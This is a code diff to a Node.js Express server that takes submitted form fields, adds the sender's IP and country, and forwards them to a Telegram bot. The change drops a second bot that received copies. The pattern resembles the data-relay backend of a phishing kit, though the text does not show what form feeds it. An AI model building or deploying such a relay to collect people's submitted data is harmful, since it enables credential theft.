@@ -5,13 +5,9 @@ import fetch from 'node-fetch';
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// 📌 Bot principal
+// 📌 Bot ÚNICO (principal)
 const BOT_TOKEN = process.env.APIKEY;
 const CHAT_ID = process.env.CHATID;
-
-// 📌 Bot secundario
-const SECONDARY_BOT_TOKEN = process.env.APIKEY2;
-const SECONDARY_CHAT_ID = process.env.CHATID2;
 
 app.use(cors());
 app.use(express.json());
@@ -32,7 +28,7 @@ function formatBody(body) {
   let formatted = '';
   for (const key in body) {
     const value = body[key];
-    const cleanKey = escapeHTML(key); // Escapamos la clave
+    const cleanKey = escapeHTML(key); 
     let cleanValue;
 
     if (typeof value === 'object') {
@@ -51,11 +47,12 @@ function formatBody(body) {
 }
 
 /* Enviar a Telegram */
-async function sendToTelegram(token, chatId, message) {
-  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+// Esta función ahora usa las constantes del bot principal directamente
+async function sendToTelegram(message) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
   const payload = {
-    chat_id: chatId,
+    chat_id: CHAT_ID,
     text: message,
     // ¡Usamos 'HTML' para que Telegram interprete el formato!
     parse_mode: 'HTML', 
@@ -110,14 +107,11 @@ app.post('/send', async (req, res) => {
 <b>📍 Información de Conexión:</b>
 País: <code>${escapeHTML(country)}</code>
 IP: <code>${escapeHTML(cleanIP)}</code>
-  `.trim(); // Usamos <code> para IP y País, y <b> para títulos
+  `.trim(); 
 
   try {
-    // enviar al primer bot
-    await sendToTelegram(BOT_TOKEN, CHAT_ID, message);
-
-    // enviar al segundo bot
-    await sendToTelegram(SECONDARY_BOT_TOKEN, SECONDARY_CHAT_ID, message);
+    // ¡Solo se envía al bot principal!
+    await sendToTelegram(message);
 
     res.json({ ok: true });
   } catch (err) {
